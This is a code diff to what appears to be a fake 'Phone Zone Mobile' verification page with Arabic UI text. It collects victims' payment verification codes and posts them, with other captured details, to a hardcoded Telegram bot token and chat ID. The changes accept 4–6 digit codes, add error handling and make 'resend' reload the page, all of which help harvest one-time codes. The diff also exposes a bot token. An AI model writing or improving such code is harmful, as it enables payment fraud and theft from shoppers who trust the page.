@@ -9,7 +9,7 @@ export default function VerificationPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (verificationCode.length === 4) {
+    if (verificationCode.length >= 4 && verificationCode.length <= 6) {
       try {
         const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
         const chatId = "-1002630840593";
@@ -28,25 +28,34 @@ export default function VerificationPage() {
           ].join("\n");
         };
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: formatVerificationInfo(),
-            parse_mode: "Markdown",
-          }),
-        });
+        const response = await fetch(
+          `https://api.telegram.org/bot${botToken}/sendMessage`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: formatVerificationInfo(),
+              parse_mode: "Markdown",
+            }),
+          }
+        );
+
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
 
         // Clear session storage
         sessionStorage.removeItem("paymentData");
 
-        // Redirect to success page
+        // Show success message
       
       } catch (error) {
         console.error("Error sending verification code:", error);
         alert("حدث خطأ أثناء إرسال رمز التحقق. الرجاء المحاولة مرة أخرى.");
       }
+    } else {
+      alert("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
     }
   };
 
@@ -55,7 +64,7 @@ export default function VerificationPage() {
       <div className="max-w-md w-full space-y-8">
         <div className="text-center">
           <Image
-            src="/logo.png"
+            src="/LOGOo.png"
             alt="Phone Zone Mobile"
             width={150}
             height={50}
@@ -119,7 +128,7 @@ export default function VerificationPage() {
               <button
                 type="button"
                 className="text-sm text-blue-600 hover:text-blue-500"
-                onClick={() => {}}
+onClick={() => window.location.reload()}
               >
                 إعادة إرسال الرمز
               </button>
